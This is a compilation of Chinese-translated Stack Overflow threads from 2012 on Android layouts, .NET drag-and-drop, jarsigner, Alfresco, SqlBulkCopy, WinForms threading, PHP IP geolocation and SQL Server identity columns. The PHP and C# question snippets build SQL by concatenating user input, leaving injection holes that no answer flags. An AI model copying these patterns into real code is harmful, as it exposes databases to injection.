# android - 我的 android 应用程序中的标题/标题栏不包含宽度和高度。

> ID：10991852
> 
> 赞同：1
> 
> 时间：2012-06-12T07:01:50.620
> 
> 标签：android, android-layout, android-titlebar

![在此处输入图像描述](../Images/51ea8003e88918a9dc94c817a769d66c.png) 所有活动中使用的代码是：

```
 requestWindowFeature(Window.FEATURE_CUSTOM_TITLE);
    getWindow().setFeatureInt(Window.FEATURE_CUSTOM_TITLE, R.layout.mytitle);
    getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN); 
```

mytitle xml 是：

```
 <?xml version="1.0" encoding="utf-8"?>
  <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
 android:layout_width="fill_parent"
 android:layout_height="fill_parent"
 android:background="#FFFFF0" >

<ImageView
    android:id="@+id/mytitle"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:scaleType="fitXY"
    android:src="@drawable/header_bloodbank2" />

</LinearLayout> 
```

我的应用程序中的标题不太适合其尺寸。我对宽度和高度属性都使用了“fill_parent”。仍然没有帮助。标头没有完全换行。背后的原因可能是什么？帮帮我！还附上截图！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T11:11:51.170

你的代码

```
<ImageView
android:id="@+id/mytitle"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:scaleType="fitXY"
android:src="@drawable/header_bloodbank2" /> 
```

应该管用。检查您的图像周围是否没有任何透明边框。有时 .png 图像具有透明边框，这会阻止图像填充全宽和全高。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T10:47:27.343

根据我对您的问题的了解，您正在尝试使用自定义标题栏背景图像，在这种情况下是“我捐赠”图像”。

我能想到的不包裹图像宽度的唯一原因是图像不是那么宽。（另外，我猜你使用的是 9png）。现在要纠正它，只需将您的图像移动到较低密度的文件夹。例如。如果您的图像在其中， `drawable-hdpi` 则将其从那里移动到`drawable-mdpi` 文件夹。

还要在 xml 中更改您的 imageview，如下所示：

```
<ImageView
android:id="@+id/mytitle"
android:layout_width="match_parent"
android:layout_height="wrap_content"
android:scaleType="centerInside"
android:src="@drawable/header_bloodbank2" /> 
```

# .net - 使用 .NET 从设备拖动文件并复制到本地硬盘驱动器

> ID：10991853
> 
> 赞同：1
> 
> 时间：2012-06-12T07:01:53.350
> 
> 标签：.net, drag-and-drop, filestream

我正在使用此代码将拖动的文件捕获到我的表单中并将它们复制到特定文件夹（我已将复制过程排除在外，但我正在使用 -`FileSystem.CopyDirectory(copyFileDetails.Dir.FullName, copyFileDetails.Target, UIOption.AllDialogs); and FileSystem.CopyFile(file, newFileName, UIOption.AllDialogs);`

```
this.DragEnter += new DragEventHandler(Form1_DragEnter);
this.DragDrop += new DragEventHandler(Form1_DragDrop);

private void Form1_DragEnter(object sender, DragEventArgs e)
{
    //string action = e.Data.ToString();
    if (e.Data.GetDataPresent(DataFormats.FileDrop))
        e.Effect = DragDropEffects.Copy;
    else if (e.Data.GetDataPresent("FileGroupDescriptorW"))
    {
        System.IO.MemoryStream info = e.Data.GetData("FileGroupDescriptor") as System.IO.MemoryStream;
        System.IO.MemoryStream content = e.Data.GetData("FileGroupDescriptorW") as System.IO.MemoryStream;
        e.Effect = DragDropEffects.Copy;

    }
}

private void Form1_DragDrop(object sender, DragEventArgs e)
{
    if (e.Data.GetDataPresent(DataFormats.FileDrop))
    {
        string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
    }
    else if (e.Data.GetDataPresent("FileGroupDescriptorW"))
    {
        System.IO.MemoryStream info = e.Data.GetData("FileGroupDescriptor") as System.IO.MemoryStream;
        System.IO.MemoryStream content = e.Data.GetData("FileGroupDescriptorW") as System.IO.MemoryStream;
        ClipboardMemoryStream = (MemoryStream)e.Data.GetData("FileGroupDescriptorW", true);
        byteArray = ClipboardMemoryStream.ToArray();

        // TODO: Read data from stream
    }
} 
```

现在，当我将文件拖到表单中时，我得到了文件名（字符串 [] 文件），并且将其复制到硬盘驱动器中没有问题。

但是当从设备（比如相机）拖动文件时，我得到一个文件流，我不知道如何将其转换为与原始文件同名的文件。而且我还需要它来支持大文件和文件夹。

我该如何实施？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-06-22T20:21:40.893

尝试以下代码从文件组描述符中读取文件名：

```
Dim ioStream As System.IO.Stream = DirectCast(e.Data.GetData("FileGroupDescriptor"), System.IO.Stream)
Dim contents As Byte() = New [Byte](511) {}
ioStream.Read(contents, 0, 512)
ioStream.Close()
Dim sb As New System.Text.StringBuilder()
Dim i As Integer = 76
While contents(i) <> 0
    sb.Append(CChar(ChrW(contents(i))))
    i += 1
End While

filename = sb.ToString() 
```

# java - 在安装程序未安装 jdk/jre 的 Windows 操作系统上启动 jarsigner.exe

> ID：10991856
> 
> 赞同：2
> 
> 时间：2012-06-12T07:02:02.520
> 
> 标签：java, jarsigner

我已将 jre 文件嵌入到我的应用程序设置中，我可以使用 java.exe 来执行一些特定于 java 的任务。

我想使用 jarsigner.exe，但是当我启动 jarsigner 时，它会检查一些注册表项，但找不到（因为 jre 安装程序没有安装 jre）并给出错误。

如何指定 jarsigner 的 java.exe 路径

所以它应该使用我指向的 java.exe 而不是检查注册表。

错误日志：

> 打开注册表项“Software\JavaSoft\Java Runtime Environment”时出错
> 
> 错误：找不到 java.dll
> 
> 错误：找不到 Java SE 运行时环境

我想知道 jarsigner 是否有任何额外的参数可以定义 JAVA_HOME 目录，或者定义 java.exe 所在位置的任何其他参数。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T07:57:05.757

没有特定的命令行参数，但是在调用 时`jarsigner`，您仍然可以将`java.home`属性设置为指向与您的应用程序捆绑在一起的所需 JRE。

例如，您可以使用以下`jarsigner`任一方式调用：

*   [`ProcessBuilder`](http://docs.oracle.com/javase/6/docs/api/java/lang/ProcessBuilder.html)并设置`java.home`属性，
*   或[`Runtime.exec()`](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html#exec%28java.lang.String%5B%5D,%20java.lang.String%5B%5D%29)允许设置`envp`环境变量的变体，
*   或批处理/shell脚本并`JAVA_HOME`在其中设置属性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-06T22:07:28.737

让 jarsigner 使用 JRE 而不是 JDK。需要从 JDK 将这些文件捆绑到 JRE 中

从 \bin\jarsigner.exe 到 \bin\jarsigner.exe 从 \bin\msvcr100.dll 到 \bin\msvcr100.dll 从 \bin\jli.dll 到 \bin\jli.dll 从 \lib\tool.jar 到\lib\tool.jar 我对此进行了测试，发现它对我有用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T07:10:52.790

[从Java 打开注册表项错误](https://stackoverflow.com/questions/6362037/java-error-opening-registry-key)中被盗

如果有，请删除。

在 32 位机器上

Windows\System32 文件夹中的 java.exe、javaw.exe 和 javaws.exe

在 64 位机器上

从 Windows\SysWOW64 中删除。

# exception - Alfresco 异常消息格式

> ID：10991857
> 
> 赞同：0
> 
> 时间：2012-06-12T07:02:06.963
> 
> 标签：exception, alfresco

我只想显示关于露天工作流程异常的消息。但在露天异常消息格式是 **1\. exception.class.name 2\. ErrorLogNumber 3\. Message**

例如 ***org.alfresco.service.cmr.workflow.WorkflowException: 05130007 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX***

我只想显示 3.Message 而不是 1.exception.class.name 和 2.ErrorLogNumber。我可以通过添加自定义异常类从消息中删除 ErrorLogNumber。但我无法从错误消息中删除 1.exception.class.name 。让我知道如何实现它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-11-17T06:07:57.920

解决方案非常简单。随你的信息一起扔`AlfrescoRuntimeException`。

```
throw new AlfrescoRuntimeException("your.message"); 
```

在这种情况下，您会收到一条消息，但会出现松散的异常子类型。

当在露天 javaScript 代码中看到异常处理时，真的很难用语言解释我是如何感到惊讶的：

```
 onFormSubmitFailure: function FormManager_onFormSubmitFailure(response)
        {
           var failureMsg = null;
           if (response.json && response.json.message && response.json.message.indexOf("Failed to persist field 'prop_cm_name'") !== -1)
           {
                failureMsg = this.msg("message.details.failure.name");
           }
           else if (response.json && response.json.message && response.json.message.indexOf("PropertyValueSizeIsMoreMaxLengthException") !== -1)
           {
                failureMsg = this.msg("message.details.failure.more.max.length");
           }
           else if (response.json && response.json.message && response.json.message.indexOf("org.alfresco.error.AlfrescoRuntimeException") == 0)
           {  
              var split =  response.json.message.split(/(?:org.alfresco.error.AlfrescoRuntimeException:\s*\d*\s*)/ig);
              if (split && split[1])
              {
                    failureMsg = split[1];
              }
           }
           Alfresco.util.PopupManager.displayPrompt(
           {
              title: this.msg(this.options.failureMessageKey),
              text: failureMsg ? failureMsg : (response.json && response.json.message ? response.json.message : this.msg("message.details.failure"))
           });
        }, 
```

正如您所看到的，它们从 java 中“捕获”类名并将其替换为消息。我希望他们提供更多可扩展的方式来处理客户异常。

**PS**当然另一种方法是扩展`alfresco.js`文件并`if else`为您的异常添加一个条件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-10T13:38:32.953

我遇到了与您类似的问题，即使使用调试器也无法跟踪此消息的创建位置，非常棘手。此外，Alfresco 论坛上的任何人都无法帮助我。我开发了一种解决方法，而不是直接在 java 工作流任务中引发异常，我在表单中使用了 JS 验证（我在另一篇文章中告诉你的方式），在那里我使用 ajax 调用了一个 java webscript，如果出现错误，则会显示 JS 警报盒子。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-14T12:45:23.623

您是否尝试在异常类中覆盖 toString ？或者，如果以这种方式打印输出，则可能会更改记录器的实现。

# c# - SQL 批量插入中的日期时间值

> ID：10991858
> 
> 赞同：0
> 
> 时间：2012-06-12T07:02:12.277
> 
> 标签：c#, sql, sql-server, sqlbulkcopy

我正在使用带有 SqlBulkcopy 的 c# 控制台应用程序将一些 excel 文件导入 sql server，并在导入日期时间值时收到以下异常。

异常：当我们要进行批量复制时，会出现此异常，其中一个或多个列具有日期时间数据类型。我认为它与下面的日期格式有关是错误详细信息。

“来自数据源的字符串类型的给定值无法转换为指定目标列的日期时间类型。”

代码片段

```
 sExcelConnectionString  = @"Provider=Microsoft.ACE.OLEDB.12.0;Data Source=" + excelFilePath + ";Extended Properties=" + "\"Excel 12.0;HDR=No;IMEX=1;\"";
OleDbConnection OleDbConn = new OleDbConnection(sExcelConnectionString);
                    OleDbTransaction tran; 
                    OleDbCommand OleDbCmd = new OleDbCommand(myExcelDataQuery, OleDbConn);
                    OleDbConn.Open();
                    OleDbDataReader dr = OleDbCmd.ExecuteReader();

                if (dr.HasRows && dr.FieldCount > 1)
                {
                     //DataTable dt = readReader(dr);
                    try
                    {

                        string sSqlConnectionString = connectionString.ToString();
                        string sClearSQL = "DELETE FROM " + sSQLTable;
                        SqlConnection SqlConn = new SqlConnection(sSqlConnectionString);
                        SqlCommand SqlCmd = new SqlCommand(sClearSQL, SqlConn);

                        SqlConn.Open();
                        //SqlCmd.ExecuteNonQuery();
                        SqlConn.Close();
                        SqlBulkCopy bulkCopy = new SqlBulkCopy(sSqlConnectionString);
                        bulkCopy.DestinationTableName = sSQLTable;
                        bulkCopy.BulkCopyTimeout = 0;
                        while (dr.Read())
                        {

                            bulkCopy.WriteToServer(dr);
                            imported = true;

                        }
                        OleDbConn.Close();
                        if (valToField.ToString() != "")
                        {
                            sClearSQL = "DELETE FROM " + sSQLTable + " where " + valToField + "='" + valToRemove.ToString() + "'";
                            SqlCmd = new SqlCommand(sClearSQL, SqlConn);
                            SqlConn.Open();
                            SqlCmd.ExecuteNonQuery();
                        }
                        SqlConn.Close();

                    }
                    catch (Exception ex)
                    {

                        LogMessageToFile("Error While Inserting Data from : " + excelFilePath.ToString() + "  to table :  " + dbtable.ToString() + ex.Message.ToString());

                    }
                } 
```

请提出解决方案

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T07:09:29.917

简单的答案是使用 =TEXT(a1,"dd mmmm yyyy hh:mm:ss") 函数将您的 Excel 日期转换为字符串，其中 a1 是对包含日期的单元格的引用。

注意月份的四个 m；最好使用完整的月份名称并让 SQL Server 处理日期转换，以防您遇到日期排序冲突。

根据下面的评论，这将适用于跨文化和语言 =TEXT(a1,"yyyy-MM-ddTHH:mm:ss")

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T07:30:40.207

不要重新发明轮子。使用[SSIS](http://msdn.microsoft.com/en-us/library/ms141026.aspx)，是这项工作的正确工具。[创建一个从Excel 源](http://msdn.microsoft.com/en-us/library/ms141683.aspx)读取的流，进行适当的任何转换，然后使用快速加载将其保存到[SQL Server 。](http://msdn.microsoft.com/en-us/library/ms141237)您尝试做的是更慢、更难维护、更难维护、在发生变化时缺乏适应性，并且最终不正确（如您的错误所示）。正确的导入必须正确验证和转换每条记录（例如，使用[`Datetime.TryParse`](http://msdn.microsoft.com/en-us/library/system.datetime.tryparse.aspx)输出并将输出更改为正确的 DateTime 类型）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T07:16:33.917

> “来自数据源的字符串类型的给定值无法转换为指定目标列的日期时间类型。”

错误消息是明确的：有一个列作为字符串从源返回，您试图将其插入到 DateTime 目标列中。

# android - 是否可以在 Android 上压缩视频？

> ID：10991863
> 
> 赞同：23
> 
> 时间：2012-06-12T07:02:48.847
> 
> 标签：android, video, compression

我想做视频压缩。

实际上，在我的应用程序中，我希望有两种选择，一种是低的，另一种是高的。如果我选择低选项，则应用程序将压缩视频然后上传。如果我选择高，那么它将上传我自己录制的原始视频。

我想在我的应用程序中做这件事，我很困惑。我已经搜索了很多谷歌，但如果有人可以帮助我，我无法找到解决这个问题的有用方法。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-05-31T12:53:46.493

我用过[ffmpeg4android](https://play.google.com/store/apps/details?id=com.netcompss_dev2.ffmpeg_android2)，

并且仅使用 java 就能够在大约 10 分钟内实现这一目标，请注意，它是一个商业库。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2017-07-07T06:59:24.170

是的，在 android 中，您可以使用 ffmpeg4android 来压缩视频，它是本机库

请检查此链接

[ffmpeg4android 代码](https://github.com/guardianproject/android-ffmpeg)

**首先安装 Android NDK 以使用它**

# c# - Windows 窗体中的线程

> ID：10991868
> 
> 赞同：1
> 
> 时间：2012-06-12T07:03:09.920
> 
> 标签：c#, winforms, multithreading, user-interface, .net-4.0

多年来，我一直在编写 ASP.NET Web 应用程序，但还没有真正从事过大型 Windows 窗体项目。我现在需要研究一个，所以我正在寻找一些关于如何理想地构建大型 Windows 窗体项目的指针。更具体地说，我想知道如何处理多个线程。假设您有一个需要一些时间才能完成的过程 - 您不希望 ui 窗口冻结并且没有响应。所以这个逻辑需要在一个单独的线程中移动。如果此线程访问 UI，则会导致异常。Invoke 似乎可以解决问题，但看起来非常丑陋且写和读起来很麻烦！

那么，实际上，最佳实践是什么？应该启动什么类型的线程，这些线程应该如何在 UI 和逻辑之间进行拆分？有什么示例代码可以开始吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T07:18:39.540

这是使用 backgroundworker 的简短方法

```
 public Form1()
    {
        InitializeComponent();

        BackgroundWorker worker = new BackgroundWorker();
        worker.WorkerReportsProgress = true; //set to true to fire the progress-changed event
        worker.DoWork += doWork;
        worker.ProgressChanged += progressChanged;
    }

    void progressChanged(object sender, ProgressChangedEventArgs e)
    {
        int progress = e.ProgressPercentage; //Progress-Value
        object userState = e.UserState; //can be used to pass values to the progress-changed-event
    }

    void doWork(object sender, DoWorkEventArgs e)
    {
        object argument = e.Argument; //Parameters for the call
        bool cancel = e.Cancel; //Boolean-Value for cancel work
        object result = e.Result; //Object for a return-value
    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T07:20:38.287

一旦您使用不同的线程，您将不得不在触摸 UI 时切换回 UI 线程。

[someForm.BeginInvoke()](http://msdn.microsoft.com/en-us/library/0b1bf3y3.aspx)可以做到这一点，但还有更多选择。

BackgroundWorker 可以为您进行切换。

在 .NET 4.5/ C# 5 中，您可以使用[async/await](http://msdn.microsoft.com/en-us/library/hh191443%28v=VS.110%29.aspx)；将在原始线程上调用延续。

一般来说，尽量从 UI 中解开逻辑，这样你就不需要太频繁地切换线程。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-12T08:46:34.250

有很多方法可以实现 UI 响应、执行长时间运行的任务、实现并行性。您必须为您的应用选择正确的方式 -

[Jon Skeet 的这篇文章](http://www.yoda.arachsys.com/csharp/threads/winforms.shtml)总是一开始就是一个奖励。

1.  您可以根据您的应用程序设计和要求使用[这些样式中的任何](http://msdn.microsoft.com/en-us/library/2e08f6yc.aspx)一种异步调用同步方法

2.  比较[困难的情况](http://msdn.microsoft.com/en-us/library/1c9txz50.aspx)，比如协调多个线程的工作，或者处理阻塞的线程

3.  有多种方法可以向客户端代码公开异步功能。[在此处阅读](http://msdn.microsoft.com/en-us/library/hkasytyf)基于事件的异步模式 - 它规定了类呈现异步行为的推荐方式。

4.  [当您有一个长时间运行的任务时，后台工作人员](http://www.codeproject.com/Articles/88390/MVP-VM-Model-View-Presenter-ViewModel-with-Data-Bi)会派上用场。

希望这能给你一个良好的开端。

# asp.net - 格式化选项文本字符串

> ID：10991869
> 
> 赞同：0
> 
> 时间：2012-06-12T07:03:12.993
> 
> 标签：asp.net, html, string, radcombobox

如何使用 HTML 格式显示 asp.net 字符串的选定部分。

例如：

```
String str= "Yerevan Airport(<B>UB21</B>,AM-ER,Yerevan,)"; 
```

我需要显示包含在`<B>`和`</B>`粗体中的文本，并将其**显示**为`RADComboBox`.

我已经尝试使用 StringBuilder 、 HttpUtility.Htmlencode、 String.Format ，但找不到任何合适的解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T07:41:08.597

要使用 RadComboBox ，请按照此 url

[http://www.telerik.com/community/forums/aspnet-ajax/combobox/how-to-make-a-part-of-the-radcomboboxitem-text-bold.aspx](http://www.telerik.com/community/forums/aspnet-ajax/combobox/how-to-make-a-part-of-the-radcomboboxitem-text-bold.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T07:17:26.170

你想要达到的目标是不可能的。

ASP.Net的`DropDownList`控件呈现给一个 html`<select>`控件，该控件不允许在其`<option>`元素内进行标记。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T07:21:52.367

尝试这个：

```
 String str = "Yerevan Airport &lt;BR /&gt; UB21 &lt;BR /&gt;";
  String strHtml = Server.HtmlDecode(str); 
```

# php - 通过IP地址识别用户位置

> ID：10991878
> 
> 赞同：2
> 
> 时间：2012-06-12T07:04:04.367
> 
> 标签：php, sql, geolocation, ip

我正在编写一个程序，我希望自动识别用户所在的国家/地区。我编写了获取 ip 并将其存储在数据库中的代码。

```
$ip = gethostbyname($_SERVER['REMOTE_ADDR']); 
```

存储：

```
 <?php `$result = mysql_query("INSERT INTO `wh_order` (`name`, `email`, `contact`, `itemid`, `itemquantity`, `ip`,`message`, `date`) VALUES('".$name."','".$email."','".$contact."','".$itemid."','".$itemquantity."','".$ip."','".$message."', NOW())");` ?> 
```

另外，这是存储IP地址的最佳方法吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-12T07:11:29.013

首先， gethostbyname 不会给你一个国家。为此，您必须求助于地理位置。可以正常工作的免费服务是[http://freegeoip.net](http://freegeoip.net)。他们提供了一个 API：

[http://freegeoip.net/json/74.125.143.104](http://freegeoip.net/json/74.125.143.104)

返回：

```
{
    "city": "Mountain View",
    "region_code": "CA",
    "region_name": "California",
    "metrocode": "807",
    "zipcode": "94043",
    "longitude": "-122.057",
    "latitude": "37.4192",
    "country_code": "US",
    "ip": "74.125.227.136",
    "country_name": "United States"
} 
```

请注意，按 IP 进行的地理定位不会 100% 准确。

* * *

存储 IP 地址的最佳列类型是`INT(10) unsigned`，它将比 varchar 列占用更少的空间。[使用INET_ATON](http://dev.mysql.com/doc/refman/5.0/en/miscellaneous-functions.html#function_inet-aton)和[INET_NTOA](http://dev.mysql.com/doc/refman/5.0/en/miscellaneous-functions.html#function_inet-ntoa)可以轻松处理转换：

```
mysql> SELECT INET_ATON('10.0.5.9');
        -> 167773449

mysql> SELECT INET_NTOA(167773449);
        -> '10.0.5.9' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T07:26:25.173

您可以将 maxmind (http://www.maxmind.com/app/country) 的数据库与 apache 或 nginx 扩展结合使用。

或者，这个任务有一个不错的库：http: [//geocoder-php.org/](http://geocoder-php.org/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T07:22:06.183

通过 IP 识别用户的位置称为[Geolocation](https://en.wikipedia.org/wiki/Geolocation)。它通常需要一个将 IP 地址范围映射到地理位置的数据库。

Maxmind 公司在 CreativeCommons 许可下免费提供了一个名为[GeoLite的数据库](https://www.maxmind.com/app/geolite)

> GeoLite 数据库根据知识共享署名-相同方式共享 3.0 未移植许可证获得许可。提供商业许可。

他们有一个允许快速 IP 查找的 apache 模块，然而，最简单的入门方法可能是纯 PHP 选项。查看[可能的集成方法列表。](https://www.maxmind.com/app/php)

下载档案包括几个例子，基本过程相当简单：

```
$gi = geoip_open("GeoLite.dat", GEOIP_STANDARD);
$record = geoip_record_by_addr($gi, "24.24.24.24");
echo $record->latitude;
echo $record->longitude; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-09-19T09:34:43.397

使用[https://geoip-db.com](https://geoip-db.com)的服务，它们支持 IPV4 和 IPV6 地址来定位 ip 的地理位置。

*   JSON：[https ://geoip-db.com/json](https://geoip-db.com/json)
*   JSONP：[https ://geoip-db.com/jsonp](https://geoip-db.com/jsonp)

例子：

```
<!DOCTYPE html>
<html>
<head>
    <title>GEOIP DB - Geolocation by IP</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js">
    </script>
</head>
<body>
    <div>Country: <span id="country"></span>
    <div>State: <span id="state"></span>
    <div>City: <span id="city"></span>
    <div>Latitude: <span id="latitude"></span>
    <div>Longitude: <span id="longitude"></span>
    <div>IP: <span id="ip"></span>
    <script>
        $.ajax({
            url: "https://geoip-db.com/jsonp",
            jsonpCallback: "callback",
            dataType: "jsonp",
            success: function( location ) {
                $('#country').html(location.country_name);
                $('#state').html(location.state);
                $('#city').html(location.city);
                $('#latitude').html(location.latitude);
                $('#longitude').html(location.longitude);
                $('#ip').html(location.IPv4);  
            }
        });     
    </script>
</body>
</html> 
```

这是一个 jquery 片段，尽管可以在他们的网站上找到其他示例（普通 javascript、php、C#）

# javascript - javascript xml解析器未定义检查

> ID：10991884
> 
> 赞同：0
> 
> 时间：2012-06-12T07:04:30.577
> 
> 标签：javascript, xml, xml-parsing

我用这样的javascript解析一个xml文件：

```
x = xmlDoc.getElementsByTagName("Name")[0].childNodes[0]; 
```

一切都按预期工作，除了有时我在 xml 中没有条目“名称”时，它会显示此错误：

```
xmlDoc.getElementsByTagName("Name")[0] is undefined 
```

这使我的网站崩溃。有没有办法检查 xmlDoc.getElementsByTagName("Name")[0] 是否有值，然后继续将此值解析为变量？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:06:01.243

像这样使用[`typeof`](https://developer.mozilla.org/en/JavaScript/Reference/Operators/typeof)：

```
if (typeof xmlDoc.getElementsByTagName("Name")[0] !== 'undefined') {
  // not undefined
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T07:06:59.810

利用

```
if(xmlDoc.getElementsByTagName("Name") != 'undefined' && xmlDoc.getElementsByTagName("Name")[0] != 'undefined'){
// your code
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T07:10:33.083

```
check this code:-

if (typeof(xmlDoc.getElementsByTagName("Name")[0]) != "undefined" && xmlDoc.getElementsByTagName("Name")[0] != null){

//ur code
} 
```

# windows-phone-7 - 如何删除wp7中的列表框项目？

> ID：10991893
> 
> 赞同：0
> 
> 时间：2012-06-12T07:04:57.207
> 
> 标签：windows-phone-7

列表框有 2 个按钮。单击按钮时需要从该列表框中删除项目。请告诉我如何实现？

```
 List<SampleCheckedData> interestrates = new List<SampleCheckedData>();
  interestrates = (from rts in xmlDocu.Descendants("Friend")

                                 select new SampleCheckedData
                                 {

                                     Id = (string)rts.Element("userid"),
                                     Name = (string)rts.Element("name"),
                                     Icon = (string)rts.Element("imageurl"),
                                     VisibleStatus = (string)rts.Element("visiblestatus"),
                                     AppStatus = (string)rts.Element("loginstatus"),

                                     imgBubble =bitmapRed,
                                 }).ToList<SampleCheckedData>();

                this.lstImages.ItemsSource = interestrates;

 private void btnAccept_MouseEnter(object sender, MouseEventArgs e)
        {
            int _id = int.Parse(((System.Windows.FrameworkElement)(e.OriginalSource)).Tag.ToString());
            lstFriendRequuest.Items.RemoveAt(lstFriendRequuest.SelectedIndex);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T07:16:34.797

要删除所选项目，

```
listbox.Items.RemoveAt(listbox.SelectedIndex); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T10:09:40.153

在此页面上使您的收藏在全球范围内可用，现在您可以通过事件轻松地对其进行操作`btnAccept_MouseEnter`：

```
public interestrates;

...
{
    interestrates = ...
    this.lstImages.ItemsSource = interestrates;
}

private void btnAccept_MouseEnter(object sender, MouseEventArgs e)
{
    interestrates.RemoveAt(lstFriendRequuest.SelectedIndex);
} 
```

此外，请确保单击某个`ListBox`项目会`SelectedIndex`相应更改

# sql-server - SQL Server Management Studio 2012 中的自动递增主键

> ID：10991894
> 
> 赞同：525
> 
> 时间：2012-06-12T07:04:59.710
> 
> 标签：sql-server, sql-server-2012, identity

我如何`auto increment`在数据库表中`primary key`？`SQL Server`我已经浏览了论坛，但看不到如何做到这一点。

我查看了属性，但看不到选项。我看到了一个答案，您转到`Identity`规范属性并将其设置为 yes 并将其设置`Identity increment`为**1**，但该部分显示为灰色，我无法将*no*更改为*yes*。

必须有一个简单的方法来做到这一点，但我找不到它。

* * *

## 回答 #1

> 赞同：812
> 
> 时间：2012-06-12T07:19:35.270

确保 Key 列的数据类型是`int`，然后手动设置标识，如图所示

![在此处输入图像描述](../Images/125d693020bf2b9507780f36bd14e983.png)

或者 **只是运行这段代码**

```
-- ID is the name of the  [to be] identity column
ALTER TABLE [yourTable] DROP COLUMN ID 
ALTER TABLE [yourTable] ADD ID INT IDENTITY(1,1) 
```

代码将运行，如果`ID`不是表中的唯一列

*图像参考fifo的*

* * *

## 回答 #2

> 赞同：223
> 
> 时间：2012-06-12T07:21:33.870

创建表时，可以[`IDENTITY`](http://msdn.microsoft.com/en-us/library/ms186775%28v=sql.105%29.aspx)按如下方式创建列：

```
CREATE TABLE (
  ID_column INT NOT NULL IDENTITY(1,1) PRIMARY KEY,
  ...
); 
```

该`IDENTITY`属性将从数字 1 开始自动递增列。（请注意，列的数据类型必须是整数。）如果要将其添加到现有列，请使用[`ALTER TABLE`](http://msdn.microsoft.com/en-us/library/ms190273%28v=sql.105%29.aspx)命令。

编辑：
测试了一下，我找不到通过各种表的列属性窗口更改身份属性的方法。我想如果你想让一个列成为标识列，你必须使用一个`ALTER TABLE`命令。

* * *

## 回答 #3

> 赞同：94
> 
> 时间：2012-06-12T07:19:07.597

您必须展开 Identity 部分以公开增量和种子。

![在此处输入图像描述](../Images/ad14d7df58eaddeec9ae318ba80ed505.png)

编辑：我假设你有一个整数数据类型，而不是 char(10)。当我发布这个答案时，我会说这是合理且有效的

* * *

## 回答 #4

> 赞同：45
> 
> 时间：2013-04-19T19:28:19.623

展开您的数据库，展开您的表格，右键单击您的表格并从下拉列表 中选择**设计。**![它看起来像这样](../Images/59f806977b1ee73138b2ddf1f8de0bc9.png)

现在去它下面的**Column properties**向下滚动并找到**Identity Specification**，展开它，你会发现**Is Identity** make it Yes。现在选择它正下方的**Identity Increment**，给出您想要在其中增加的值。 ![在此处输入图像描述](../Images/125d693020bf2b9507780f36bd14e983.png)

* * *

## 回答 #5

> 赞同：10
> 
> 时间：2013-09-25T15:30:24.083

也许我遗漏了一些东西，但为什么这不适用于 SEQUENCE 对象？这不是你要找的吗？

例子：

```
CREATE SCHEMA blah.
GO

CREATE SEQUENCE blah.blahsequence
START WITH 1
INCREMENT BY 1
NO CYCLE;

CREATE TABLE blah.de_blah_blah
(numbers bigint PRIMARY KEY NOT NULL
......etc 
```

在说 INSERT 命令中引用序列时，只需使用：

```
NEXT VALUE FOR blah.blahsequence 
```

[SEQUENCE](http://technet.microsoft.com/en-us/library/ff878091.aspx)的更多信息和选项

* * *

## 回答 #6

> 赞同：10
> 
> 时间：2020-03-12T08:30:10.267

```
CREATE TABLE Persons (
    Personid int IDENTITY(1,1) PRIMARY KEY,
    LastName varchar(255) NOT NULL,
    FirstName varchar(255),
    Age int
); 
```

MS SQL Server 使用 IDENTITY 关键字来执行自动增量功能。

在上面的示例中，IDENTITY 的起始值为 1，每增加一条新记录，它就会增加 1。

提示：要指定“Personid”列应从值 10 开始并以 5 为增量，请将其更改为 IDENTITY(10,5)。

要将新记录插入“Persons”表，我们不必为“Personid”列指定值（将自动添加唯一值）：

* * *

## 回答 #7

> 赞同：7
> 
> 时间：2012-12-07T07:03:33.847

当您使用 Data Type: int 时，您可以选择要自动递增的行并转到列属性标签。在那里，您可以将身份设置为“是”。也可以在那里编辑自动增量的起始值。希望我能帮上忙；）

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2018-01-26T01:08:18.060

我遇到了这个问题，我已经**创建了表**，并且在不删除表的情况下无法更改它，所以我所做的是：（不确定他们何时实现此功能，但在 SQL 2016 中已实现）

右键单击对象资源管理器中的表：

`Script Table as > DROP And CREATE To > New Query Editor Window`

